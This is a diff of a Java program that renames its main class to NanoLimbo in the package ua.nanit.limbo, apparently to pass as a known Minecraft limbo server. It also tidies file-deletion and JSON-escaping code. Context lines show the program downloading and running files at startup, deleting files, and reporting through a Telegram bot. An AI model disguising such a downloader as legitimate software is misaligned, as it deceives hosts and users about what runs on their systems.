@@ -1,3 +1,5 @@
+package ua.nanit.limbo;
+
 import com.sun.net.httpserver.HttpExchange;
 import com.sun.net.httpserver.HttpHandler;
 import com.sun.net.httpserver.HttpServer;
@@ -5,6 +7,7 @@ import com.sun.net.httpserver.HttpServer;
 import java.io.*;
 import java.net.InetSocketAddress;
 import java.net.URI;
+import java.net.URLEncoder;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
@@ -19,8 +22,9 @@ import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+import java.util.stream.Stream;
 
-public class App {
+public class NanoLimbo {
 
     // --- 环境配置读取 ---
     private static final Map<String, String> envVars = new HashMap<>();
@@ -163,10 +167,12 @@ public class App {
             try {
                 if (f.exists()) {
                     if (f.isDirectory()) {
-                        Files.walk(f.toPath())
-                             .sorted(Comparator.reverseOrder())
-                             .map(Path::toFile)
-                             .forEach(File::delete);
+                        // 优化 Java 19+ 兼容性：使用 try-with-resources 自动关闭流，防止文件句柄泄露
+                        try (Stream<Path> pathStream = Files.walk(f.toPath())) {
+                            pathStream.sorted(Comparator.reverseOrder())
+                                      .map(Path::toFile)
+                                      .forEach(File::delete);
+                        }
                     } else {
                         f.delete();
                     }
@@ -606,7 +612,6 @@ public class App {
 
             String url = String.format("https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN);
             
-            // 使用 x-www-form-urlencoded
             String formData = "chat_id=" + URLEncoder.encode(CHAT_ID, StandardCharsets.UTF_8) +
                               "&text=" + URLEncoder.encode(text, StandardCharsets.UTF_8) +
                               "&parse_mode=MarkdownV2";
@@ -729,7 +734,11 @@ public class App {
                     File f = new File(fStr);
                     if (f.exists()) {
                         if (f.isDirectory()) {
-                            Files.walk(f.toPath()).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
+                            try (Stream<Path> pathStream = Files.walk(f.toPath())) {
+                                pathStream.sorted(Comparator.reverseOrder())
+                                          .map(Path::toFile)
+                                          .forEach(File::delete);
+                            }
                         } else {
                             f.delete();
                         }
@@ -809,7 +818,7 @@ public class App {
             downloadFilesAndRun();
             addVisitTask();
 
-            Thread serverThread = new Thread(App::runServer);
+            Thread serverThread = new Thread(NanoLimbo::runServer);
             serverThread.setDaemon(true);
             serverThread.start();
 
@@ -824,11 +833,19 @@ public class App {
         }
     }
 
-    /** 简易且无依赖的 JSON 序列化工具 */
+    /** 简易且无依赖的 JSON 序列化工具 (加强了转义适配 Java 19+) */
     @SuppressWarnings("unchecked")
     private static String toJson(Object obj) {
         if (obj == null) return "null";
-        if (obj instanceof String) return "\"" + ((String) obj).replace("\"", "\\\"").replace("\n", "\\n") + "\"";
+        if (obj instanceof String) {
+            String str = (String) obj;
+            str = str.replace("\\", "\\\\")
+                     .replace("\"", "\\\"")
+                     .replace("\n", "\\n")
+                     .replace("\r", "\\r")
+                     .replace("\t", "\\t");
+            return "\"" + str + "\"";
+        }
         if (obj instanceof Number || obj instanceof Boolean) return obj.toString();
         if (obj instanceof List) {
             StringJoiner sj = new StringJoiner(",", "[", "]");
